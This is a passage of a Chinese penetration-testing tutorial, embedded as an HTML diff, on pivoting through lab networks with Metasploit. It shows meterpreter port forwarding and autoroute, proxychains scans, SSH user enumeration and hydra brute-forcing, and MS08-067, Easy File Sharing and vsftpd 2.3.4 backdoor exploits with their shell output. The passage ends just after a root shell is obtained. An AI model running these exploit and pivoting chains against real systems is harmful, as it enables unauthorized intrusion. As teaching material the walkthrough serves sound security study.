+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:139-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:135-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:445-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Nmap scan report for 7.7.7.20
+Host is up (0.17s latency).
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
+80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
+135/tcp  open     msrpc        Microsoft Windows RPC
+139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
+Host script results:
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs: CVE:CVE-2008-4250
+|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
+|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
+|          code via a crafted RPC request that triggers the overflow during path canonicalization.
+| 
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
+root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;现在发现了7.7.7.20(JC)这台机器端口开放比较多,尝试找出JC的漏洞,操作如下:
+首先看看JC的80端口运行了什么cms,但是Attacker的浏览器直接访问http://172.16.0.20会无法访问,因为Attacker的网段与JC
+不在同一网段,此处有个要注意的内容:&lt;/p&gt;
+&lt;font color=&quot;red&quot;&gt;Attention:&lt;/font&gt;
+&lt;font color=&quot;#33ccff&quot;&gt;
+可以选择使用proxychains设置Attacker的浏览器的代理为Attacker的1080端口的socks4代理入口,也可通过在RD的meterpreter会
+话中运行portfwd模块命令,portfwd命令如下:
+&lt;/font&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
+[*] Local TCP relay created: 172.16.0.20:2323 &amp;lt;-&amp;gt; 7.7.7.20:80
+meterpreter &amp;gt;
+
+meterpreter &amp;gt; portfwd list
+Active Port Forwards
+====================
+   Index  Local             Remote       Direction
+   -----  -----             ------       ---------
+   1      172.16.0.20:2323  7.7.7.20:80  Forward
+1 total active port forwards.
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;通过访问Attacker的2323端口访问JC的80端口,结果如下:
+&lt;img src=&quot;https://pentest.blog/wp-content/uploads/5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;pre&gt;
+&lt;font color=&quot;#33ccff&quot;&gt;
+这里的portfwd模块不只是名字上的端口转发的意思,目前笔者认为portfwd相当于半个ssh正向代理加一个ssh反向代理组成的综合命
+令,ssh正向反向代理可参考这里的理解 
+&lt;a href=&quot;http://3xp10it.cc/web/2017/02/24/ssh%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%90%86%E8%A7%A3/&quot;&gt;ssh正向反向代理理解&lt;/a&gt;
+
+笔者认为portfwd命令之后Attacker可以通过访问Attacker本身ip的2323端口进而访问到JC的80端口期间发生了3件事
+&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/dot/portfwd.png&quot; /&gt;
+
+1.RD访问JC的80端口,这里相当于半个ssh正向代理
+2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理,相当于RD有Attacker的ssh权限
+3.攻击者的浏览器访问攻击者自己的172.16.0.20:2323
+
+portfwd的用法如下:
+&lt;/font&gt;
+&lt;/pre&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; portfwd -h
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+OPTIONS:
+     -L &amp;gt;opt&amp;gt;  The local host to listen on (optional).
+     -h        Help banner.
+     -l &amp;gt;opt&amp;gt;  The local port to listen on.
+     -p &amp;gt;opt&amp;gt;  The remote port to connect on.
+     -r &amp;gt;opt&amp;gt;  The remote host to connect on.
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;font color=&quot;#33ccff&quot;&gt;
+其中-L只能设置为攻击者的ip,不能设置为肉鸡的ip,-L设置的ip可以是攻击者的内网ip,-r也可以是目标的内网ip,两个内网之
+间通过meterpreter会话的&quot;隧道&quot;来连通,如果-L后设置的ip是攻击者的内网ip,-r后设置的是目标机器的内网ip,portfwd通过
+meterpreter会话连通两台,-l是指攻击者的监听端口,运行完上面的portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
+命令后,Attacker的2323端口将变成监听状态(也即Attacker会开启2323端口)
+
+这里还要注意route add命令只能是在meterpreter会话中有效,不能系统全局有效,笔者认为route add也是通过meterpreter会
+话的&quot;隧道&quot;来实现攻击者能够访问目标机器其他网段机器的,也即在上面的Attacker通过portfwd来实现访问目标机器其他网段
+机器而不能因为在portfwd模块运行前由于已经运行了route add模块而由Attacker的浏览器直接访问目标7.7.7.20:80,因为
+route add只会给msf的模块提供meterpreter会话通道作为代理服务,只有meterpreter会话下可用的模块可以直接访问7.7.7.x
+网段,Attacker的浏览器想直接访问7.7.7.20需要使用proxychins和msf开启的sock4代理.
+&lt;/font&gt;
+
+&lt;p&gt;上面访问得到目标机器JC的80端口信息看出JC运行的是Eash File Sharing Web Server,可用msf中的模块尝试getshell,操作如
+下(如果没有在meterpreter中添加路由msf是访问不到7.7.7.20的):&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf  &amp;gt; use exploit/windows/http/easyfilesharing_seh 
+msf exploit(easyfilesharing_seh) &amp;gt; show options 
+Module options (exploit/windows/http/easyfilesharing_seh):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  80               yes       The target port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Easy File Sharing 7.2 HTTP
+msf exploit(easyfilesharing_seh) &amp;gt; set rhost 7.7.7.20
+rhost =&amp;gt; 7.7.7.20
+msf exploit(easyfilesharing_seh) &amp;gt; set payload windows/meterpreter/bind_tcp
+payload =&amp;gt; windows/meterpreter/bind_tcp
+msf exploit(easyfilesharing_seh) &amp;gt; run
+[*] Started bind handler
+[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
+[+] 7.7.7.20:80 - Exploit Sent
+[*] Sending stage (957999 bytes) to 7.7.7.20
+[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&amp;gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;或者从JC(7.7.7.20)22端口入手:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use auxiliary/scanner/ssh/ssh_enumusers 
+msf auxiliary(ssh_enumusers) &amp;gt; set rhosts 7.7.7.20
+rhosts =&amp;gt; 7.7.7.20
+msf auxiliary(ssh_enumusers) &amp;gt; set rport 22
+rport =&amp;gt; 22
+msf auxiliary(ssh_enumusers) &amp;gt; set user_file /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+user_file =&amp;gt; /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
+msf auxiliary(ssh_enumusers) &amp;gt; run
+[*] 7.7.7.20:22 - SSH - Checking for false positives
+[*] 7.7.7.20:22 - SSH - Starting scan
+[+] 7.7.7.20:22 - SSH - User 'admin' found
+[-] 7.7.7.20:22 - SSH - User 'root' not found
+[-] 7.7.7.20:22 - SSH - User 'Administrator' not found
+[+] 7.7.7.20:22 - SSH - User 'sysadm' found
+[-] 7.7.7.20:22 - SSH - User 'tech' not found
+[-] 7.7.7.20:22 - SSH - User 'operator' not found
+[+] 7.7.7.20:22 - SSH - User 'guest' found
+[-] 7.7.7.20:22 - SSH - User 'security' not found
+[-] 7.7.7.20:22 - SSH - User 'debug' not found
+[+] 7.7.7.20:22 - SSH - User 'manager' found
+[-] 7.7.7.20:22 - SSH - User 'service' not found
+[-] 7.7.7.20:22 - SSH - User '!root' not found
+[+] 7.7.7.20:22 - SSH - User 'user' found
+[-] 7.7.7.20:22 - SSH - User 'netman' not found
+[+] 7.7.7.20:22 - SSH - User 'super' found
+[-] 7.7.7.20:22 - SSH - User 'diag' not found
+[+] 7.7.7.20:22 - SSH - User 'Cisco' found
+[-] 7.7.7.20:22 - SSH - User 'Manager' not found
+[+] 7.7.7.20:22 - SSH - User 'DTA' found
+[-] 7.7.7.20:22 - SSH - User 'apc' not found
+[+] 7.7.7.20:22 - SSH - User 'User' found
+[-] 7.7.7.20:22 - SSH - User 'Admin' not found
+[+] 7.7.7.20:22 - SSH - User 'cablecom' found
+[-] 7.7.7.20:22 - SSH - User 'adm' not found
+[+] 7.7.7.20:22 - SSH - User 'wradmin' found
+[-] 7.7.7.20:22 - SSH - User 'netscreen' not found
+[+] 7.7.7.20:22 - SSH - User 'sa' found
+[-] 7.7.7.20:22 - SSH - User 'setup' not found
+[+] 7.7.7.20:22 - SSH - User 'cmaker' found
+[-] 7.7.7.20:22 - SSH - User 'enable' not found
+[+] 7.7.7.20:22 - SSH - User 'MICRO' found
+[-] 7.7.7.20:22 - SSH - User 'login' not found
+[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+^C
+msf auxiliary(ssh_enumusers) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;然后用hydra本地用msf模块开启的1080端口的sock4代理尝试爆破:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# proxychains hydra 7.7.7.20 ssh -s 22 -L /tmp/user.txt -P top100.txt -t 4
+ProxyChains-3.1 (http://proxychains.sf.net)
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (http://www.thc.org/thc-hydra) starting 
+[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
+[DATA] max 4 tasks per 1 server, overall 64 tasks, 20 login tries (l:2/p:10), ~0 tries per task
+[DATA] attacking service ssh on port 22
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+[22][ssh] host: 7.7.7.20   login: admin   password: 123456
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|S-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished
+root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;发现有可用帐户密码admin:123456,然后再用sock4代理ssh登录:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# proxychains ssh admin@7.7.7.20
+ProxyChains-3.1 (http://proxychains.sf.net)
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-7.7.7.20:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+The authenticity of host '7.7.7.20 (7.7.7.20)' can't be established.
+ECDSA key fingerprint is SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '7.7.7.20' (ECDSA) to the list of known hosts.
+admin@7.7.7.20's password: 
+bvshell:/C/Documents and Settings/All Users$ pwd
+/C/Documents and Settings/All Users
+bvshell:/C/Documents and Settings/All Users$ dir
+2016-12-24  21:32          &amp;lt;DIR&amp;gt; Application Data
+2016-12-25  06:16          &amp;lt;DIR&amp;gt; Desktop
+2016-12-24  18:36          &amp;lt;DIR&amp;gt; Documents
+2016-12-24  18:37          &amp;lt;DIR&amp;gt; DRM
+2016-12-24  21:32          &amp;lt;DIR&amp;gt; Favorites
+2016-12-24  18:38          &amp;lt;DIR&amp;gt; Start Menu
+2016-12-24  21:32          &amp;lt;DIR&amp;gt; Templates
+      0 Files                  0 bytes
+      7 Directories
+bvshell:/C/Documents and Settings/All Users$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;或者用ms08067:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; use exploit/windows/smb/ms08_067_netapi 
+msf exploit(ms08_067_netapi) &amp;gt; show options 
+Module options (exploit/windows/smb/ms08_067_netapi):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+msf exploit(ms08_067_netapi) &amp;gt; set rhost 7.7.7.20
+rhost =&amp;gt; 7.7.7.20
+msf exploit(ms08_067_netapi) &amp;gt; set payload windows/meterpreter/bind_tcp
+payload =&amp;gt; windows/meterpreter/bind_tcp
+msf exploit(ms08_067_netapi) &amp;gt; show options 
+Module options (exploit/windows/smb/ms08_067_netapi):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST    7.7.7.20         yes       The target address
+   RPORT    445              yes       The SMB service port
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Payload options (windows/meterpreter/bind_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LPORT     4444             yes       The listen port
+   RHOST     7.7.7.20         no        The target address
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+msf exploit(ms08_067_netapi) &amp;gt; run
+[*] Started bind handler
+[*] 7.7.7.20:445 - Automatically detecting the target...
+[*] 7.7.7.20:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
+[*] 7.7.7.20:445 - We could not detect the language pack, defaulting to English
+[*] 7.7.7.20:445 - Selected Target: Windows 2003 SP2 English (NX)
+[*] 7.7.7.20:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (957999 bytes) to 7.7.7.20
+[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&amp;gt; 7.7.7.20:4444) 
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;成功溢出getshell后查看JC(7.7.7.20)网卡信息:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; ipconfig
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+IPv4 Address : 127.0.0.1
+Interface 65539
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:29:cd:cb
+MTU          : 1500
+IPv4 Address : 8.8.8.3
+IPv4 Netmask : 255.255.255.0
+Interface 65540
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
+Hardware MAC : 08:00:27:e3:47:43
+MTU          : 1500
+IPv4 Address : 7.7.7.20
+IPv4 Netmask : 255.255.255.0
+meterpreter &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;发现又出现一个8.8.8.x的网段,于是将这个网段添加路由,以便msf中的模块可以访问到8.8.8.x网段&lt;/p&gt;
+
+&lt;h3 id=&quot;0x03-step3&quot;&gt;0x03 Step3&lt;/h3&gt;
+
+&lt;p&gt;先直接用新的meterpreter shell看看8.8.8.x这个网段有什么机器&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24
+[*] Running module against SRV03
+[*] ARP Scanning 8.8.8.0/24
+[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
+[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
+[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
+[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;为了让msf中所有模块都能访问到8.8.8.x网段,在新的meterpreter会话中添加路由:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter &amp;gt; run autoroute -s 8.8.8.0/24
+[*] Adding a route to 8.8.8.0/255.255.255.0...
+[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
+[*] Use the -p option to list all active routes
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;为了让Attacker的除了msf模块以外的其他应用程序能访问到8.8.8.x网段,再使用msf的开启sock4代理的模块开启另外一个端口
+作为8.8.8.x网段的入口:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf exploit(ms08_067_netapi) &amp;gt; use auxiliary/server/socks4a 
+msf auxiliary(socks4a) &amp;gt; show options 
+Module options (auxiliary/server/socks4a):
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  172.16.0.20      yes       The address to listen on
+   SRVPORT  1080             yes       The port to listen on.
+Auxiliary action:
+   Name   Description
+   ----   -----------
+   Proxy  
+msf auxiliary(socks4a) &amp;gt; set SRVPORT 1081
+SRVPORT =&amp;gt; 1081
+msf auxiliary(socks4a) &amp;gt; run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+msf auxiliary(socks4a) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;也即现在Attacker本地的1080端口的代理可以访问到7.7.7.x网段,1081端口的代理可以访问到8.8.8.x网段,然后将新开的端口
+添加到proxychains的配置文件中:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# cat /etc/proxychains.conf | grep -v &quot;#&quot;
+dynamic_chain
+proxy_dns 
+tcp_read_time_out 15000
+tcp_connect_time_out 8000
+socks4  172.16.0.20 1080  # First Pivot
+socks4  172.16.0.20 1081  # Second Pivot
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;上面的两个代理相当于扇门的钥匙,172.16.0.20:1080是7.7.7.x的钥匙,172.16.0.20:1081是7.7.7.x后面的8.8.8.x的钥匙
+,Attacker要想访问到8.8.8.x可以通过先打开7.7.7.x的门,再打开8.8.8.x的门(因为8.8.8.x这个门在7.7.7.x这个门之后)&lt;/p&gt;
+
+&lt;p&gt;使用Attacker本地的nmap扫描下8.8.8.x网段:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# proxychains nmap -sT -sV -p21,22,23,80 8.8.8.9 -n -Pn -vv
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.25BETA1 ( https://nmap.org )
+Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
+NSE: Loaded 36 scripts for scanning.
+Initiating Connect Scan
+Scanning 8.8.8.9 [4 ports]
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:21-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Discovered open port 21/tcp on 8.8.8.9
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:23-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Discovered open port 23/tcp on 8.8.8.9
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Discovered open port 22/tcp on 8.8.8.9
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Discovered open port 80/tcp on 8.8.8.9
+Completed Connect Scan at 05:54, 1.37s elapsed (4 total ports)
+Initiating Service scan at 05:54
+Scanning 4 services on 8.8.8.9
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:21-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:22-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:23-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Completed Service scan at 05:54, 11.09s elapsed (4 services on 1 host)
+NSE: Script scanning 8.8.8.9.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 05:54
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+|D-chain|-&amp;lt;&amp;gt;-172.16.0.20:1080-&amp;lt;&amp;gt;-172.16.0.20:1081-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-8.8.8.9:80-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
+Completed NSE at 05:54, 1.71s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 05:54
+Completed NSE at 05:54, 0.00s elapsed
+Nmap scan report for 8.8.8.9
+Host is up, received user-set (0.41s latency).
+Scanned 
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack vsftpd 2.3.4
+22/tcp open  ssh     syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp open  telnet  syn-ack Linux telnetd
+80/tcp open  http    syn-ack Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
+root@kali:~#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;发现8.8.8.9(SK)这台机器可能有漏洞,用msf模块尝试getshell:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &amp;gt; 
+msf &amp;gt; use exploit/unix/ftp/vsftpd_234_backdoor 
+msf exploit(vsftpd_234_backdoor) &amp;gt; show options 
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  21               yes       The target port
+Exploit target:
+   Id  Name
+   --  ----
+   0   Automatic
+msf exploit(vsftpd_234_backdoor) &amp;gt; set rhost 8.8.8.9
+rhost =&amp;gt; 8.8.8.9
+msf exploit(vsftpd_234_backdoor) &amp;gt; run
+[*] 8.8.8.9:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 8.8.8.9:21 - USER: 331 Please specify the password.
+[+] 8.8.8.9:21 - Backdoor service has been spawned, handling...
+[+] 8.8.8.9:21 - UID: uid=0(root) gid=0(root)
+[*] Found shell.
